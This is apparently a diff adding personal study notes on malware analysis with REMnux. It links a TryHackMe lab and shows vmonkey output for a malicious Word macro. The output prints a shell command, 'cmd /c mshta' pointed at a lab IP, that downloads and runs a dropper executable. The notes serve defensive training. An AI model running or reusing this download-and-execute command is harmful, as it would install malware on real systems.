@@ -1,0 +1,21 @@
+### doc ###
+## links
+https://tryhackme.com/room/malremnuxv2
+https://docs.remnux.org/
+
+
+## vmonkey
+vmonkey file.doc							# analyse macro in doc
++----------------------+---------------------------+----------------+
+| Action               | Parameters                | Description    |
++----------------------+---------------------------+----------------+
+| Found Heuristic      | DefoLegit                 |                |
+| Entry Point          |                           |                |
+| Execute Command      | cmd /c mshta http://10.0. | Shell function |
+|                      | 0.10:4444/MyDropper.exe   |                |
+| Found Heuristic      | DefoLegit                 |                |
+| Entry Point          |                           |                |
+| Execute Command      | cmd /c mshta http://10.0. | Shell function |
+|                      | 0.10:4444/MyDropper.exe   |                |
++----------------------+---------------------------+----------------+
+
